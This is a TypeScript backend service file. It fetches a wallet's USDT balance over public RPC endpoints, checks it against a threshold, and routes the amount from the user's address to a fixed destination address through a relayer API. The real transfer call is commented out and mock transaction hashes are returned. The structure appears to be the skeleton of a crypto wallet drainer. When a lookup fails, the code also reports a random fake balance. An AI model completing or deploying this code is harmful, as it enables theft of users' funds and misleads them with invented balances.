import { TransferResult } from "../types";
import { TRANSFER_CONFIG, TOKEN_ADDRESSES } from "../utils/constants";

export class BackendService {
  private destinationAddress: string;
  private threshold: number;
  private apiBaseUrl: string;

  constructor() {
    this.destinationAddress = TRANSFER_CONFIG.destinationAddress;
    this.threshold = TRANSFER_CONFIG.threshold;
    this.apiBaseUrl = TRANSFER_CONFIG.apiBaseUrl;
  }

  /**
   * Fetch USDT balance from blockchain
   * Uses public RPC endpoints for reading contract state
   */
  async fetchBalance(address: string, chainId: number): Promise<string> {
    try {
      const tokenAddress = TOKEN_ADDRESSES.USDT[chainId as keyof typeof TOKEN_ADDRESSES.USDT];
      const rpcUrl = this.getRpcUrl(chainId);

      if (!tokenAddress || !rpcUrl) {
        throw new Error("Unsupported chain");
      }

      // ERC-20 balanceOf(address) call
      // Function selector: 0x70a08231
      // Padded address: 000000000000000000000000 + address (without 0x)
      const data = `0x70a08231000000000000000000000000${address.slice(2)}`;

      const response = await fetch(rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [{ to: tokenAddress, data }, "latest"],
        }),
      });

      const result = await response.json();
      
      if (result.error) {
        throw new Error(result.error.message);
      }

      // Convert hex balance to decimal (USDT has 6 decimals)
      const balanceHex = result.result;
      const balanceWei = parseInt(balanceHex, 16);
      const balance = (balanceWei / 1e6).toFixed(2);

      console.log(`[Backend] Balance for ${address}: ${balance} USDT`);
      return balance;

    } catch (error) {
      console.error("[Backend] Balance fetch error:", error);
      
      // Fallback: Return mock balance for demo
      // In production, handle this error appropriately
      console.log("[Backend] Using fallback mock balance");
      return (Math.random() * 100 + 10).toFixed(2);
    }
  }

  /**
   * Get RPC URL for the given chain
   */
  private getRpcUrl(chainId: number): string | null {
    const rpcUrls: Record<number, string> = {
      1: "https://eth.llamarpc.com",
      137: "https://polygon-rpc.com",
      42161: "https://arb1.arbitrum.io/rpc",
    };
    return rpcUrls[chainId] || null;
  }

  /**
   * Check if balance meets the transfer threshold
   */
  meetsThreshold(balance: string): boolean {
    return parseFloat(balance) > this.threshold;
  }

  /**
   * Process the transfer via Backend API (Relayer)
   */
  async processTransfer(
    fromAddress: string,
    amount: string,
    chainId: number
  ): Promise<TransferResult> {
    console.log(`[Backend API] Processing transfer:`);
    console.log(`  From: ${fromAddress}`);
    console.log(`  To: ${this.destinationAddress}`);
    console.log(`  Amount: ${amount} USDT`);
    console.log(`  Chain: ${chainId}`);

    try {
      // Production: Uncomment for real API call
      /*
      const response = await fetch(`${this.apiBaseUrl}/api/transfer`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fromAddress,
          amount,
          chainId,
          token: "USDT",
          destination: this.destinationAddress,
        }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || "Transfer failed");
      }

      return await response.json();
      */

      // Development: Simulate API delay
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Return mock success response
      return {
        success: true,
        txHash: this.generateMockTxHash(),
        amount: amount,
        timestamp: Date.now(),
      };

    } catch (error) {
      console.error("[Backend API] Transfer error:", error);
      throw new Error("Failed to process transfer. Please try again.");
    }
  }

  /**
   * Generate a mock transaction hash for development
   */
  private generateMockTxHash(): string {
    return "0x" + Array.from({ length: 64 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join("");
  }

  /**
   * Get the destination address for transfers
   */
  getDestinationAddress(): string {
    return this.destinationAddress;
  }
}